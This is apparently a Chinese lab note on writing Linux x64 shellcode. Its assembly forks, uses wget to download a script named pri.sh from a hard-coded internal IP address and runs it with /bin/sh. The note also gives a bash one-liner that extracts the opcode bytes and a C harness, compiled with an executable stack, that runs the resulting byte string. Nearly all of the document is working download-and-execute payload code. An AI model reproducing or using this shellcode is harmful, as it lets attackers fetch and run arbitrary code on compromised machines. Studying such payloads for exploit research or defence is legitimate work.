## shellcode_ download file_ linux_x64

### 一、实验环境

* ubuntu 16.04

### 二、汇编程序

    global _start
    section .text
    _start:
    
    ;fork
    xor rax,rax
    add rax,57
    syscall
    
    xor rdi,rdi
    xor r12,r12
     
    mov r12,rax ;pid
    cmp rax,rdi
     
    jz wget
    
    ;wait(NULL)
    xor r10,r10 ;null
    xor rdx,rdx ;null
    mov rsi,r10 ;status
    mov rdi,r12 ;pid
     
    xor rax,rax
    mov al,61
    syscall
     
    
    
    ;chmod x
    xor rdx,rdx
    mov si,0x1ff
    push 0x78
    mov rdi, rsp
    xor rax, rax
    mov al, 0x5a
    syscall
    
    ;exec x
    xor rax,rax
    xor rdx,rdx
    push rax
    push rax
     
     
    mov [rsp],dword '//bi'
    mov [rsp+4],dword 'n/sh'
     
     
    mov rdi,rsp
     
     
    push rax
    push rax 
     
    mov [rsp],dword 'pri'
    mov [rsp+3],word '.s'
    mov [rsp+5],byte 'h'
    mov rsi,rsp
     
    push rdx
    push rsi
    push rdi
     
    mov rsi,rsp
     
    add rax,59
    syscall
    ;--------
    ;close(fd)
     
    push r9
    pop rdi
     
    push 3
    pop rax
    syscall
    
    wget:
    
    ;download 192.168.227.11//x with wget
    
    ;execve("/usr/bin//wget",{"/usr/bin//wget","http ://1 92.1 68.3 0.12 9/pr i.sh","-O",".pri.sh",NULL},NULL)
     
    xor rax,rax
     
     
    push rax
    push rax
    push rax
     
    mov [rsp],dword '/usr'
    mov [rsp+4],dword '/bin'
    mov [rsp+8],dword '//wg'
    mov [rsp+12],word 'et'
     
    mov rdi,rsp
     
    push rax
    push rax
    push rax
    push rax
     
    ;----------------------
    ;cusmizetd these statements for the link of pri.sh
    mov [rsp],dword 'http'
    mov [rsp+4],dword '://1'
    mov [rsp+8],dword '92.1'
    mov [rsp+12],dword '68.2'
    mov [rsp+16],dword '27.1'
    mov [rsp+20],dword '1/pr'
    mov [rsp+24],dword 'i.sh'
    ;------------------------
     
    mov rsi,rsp
    xor rdx,rdx
     
    push rax
	push rax
    push rax
    push rax
    push rax
    push rax
    push rax
     
    mov [rsp],word '-O'
    mov rcx,rsp

    push rax
    push rax
    mov [rsp],dword 'pri'
    mov [rsp+3],word '.s'
    mov [rsp+5],byte 'h'
     
    mov r15,rsp

    push rdx

    push r15
    push rcx
    push rsi

    push rdi
     
    mov rsi,rsp
     
    mov al,59
    syscall

	
* C语言程序：
	* 汇编转换为shellcode：

		    #!/bin/bash
    		for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

	* 编译sudo gcc -fno-stack-protector -z execstack shellcode_x64.c -o shellcode_x64

			#include<stdio.h>
		    #include<string.h>
		    unsigned char code[] = \
			"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\x48\x31\xff\x4d\x31\xe4\x49\x89\xc4\x48\x39\xf8\x74\x6c\x4d\x31\xd2\x48\x31\xd2\x4c\x89\xd6\x4c\x89\xe7\x48\x31\xc0\xb0\x3d\x0f\x05\x48\x31\xd2\x66\xbe\xff\x01\x6a\x78\x48\x89\xe7\x48\x31\xc0\xb0\x5a\x0f\x05\x48\x31\xc0\x48\x31\xd2\x50\x50\xc7\x04\x24\x2f\x2f\x62\xc7\x44\x24\x04\x6e\x2f\x68\x48\x89\xe7\x50\x50\xc7\x04\x24\x70\x72\x69\x66\xc7\x44\x24\x03\x2e\xc6\x44\x24\x05\x68\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x41\x51\x5f\x6a\x03\x58\x0f\x05\x48\x31\xc0\x50\x50\x50\xc7\x04\x24\x2f\x75\x73\xc7\x44\x24\x04\x2f\x62\x6e\xc7\x44\x24\x08\x2f\x2f\x67\x66\xc7\x44\x24\x0c\x65\x48\x89\xe7\x50\x50\x50\x50\xc7\x04\x24\x68\x74\x74\xc7\x44\x24\x04\x3a\x2f\x31\xc7\x44\x24\x08\x39\x32\x31\xc7\x44\x24\x0c\x36\x38\x32\xc7\x44\x24\x10\x32\x37\x31\xc7\x44\x24\x14\x31\x2f\x72\xc7\x44\x24\x18\x69\x2e\x68\x48\x89\xe6\x48\x31\xd2\x50\x66\xc7\x04\x24\x2d\x4f\x48\x89\xe1\x50\x50\xc7\x04\x24\x70\x72\x69\x66\xc7\x44\x24\x03\x2e\xc6\x44\x24\x05\x68\x49\x89\xe7\x52\x41\x57\x51\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
			
			main()
			{
				printf("Shellcode Length:  %d\n", strlen(code));
				int (*ret)() = (int(*)())code;
				ret();
			}

### 四、参考资料

* https://www.cnblogs.com/Tesi1a/p/7624052.html

* https://govolution.wordpress.com/2015/04/21/shifting-from-32bit-to-64bit-linux-shellcode/

* https://blog.csdn.net/qq_29343201/article/details/52209588
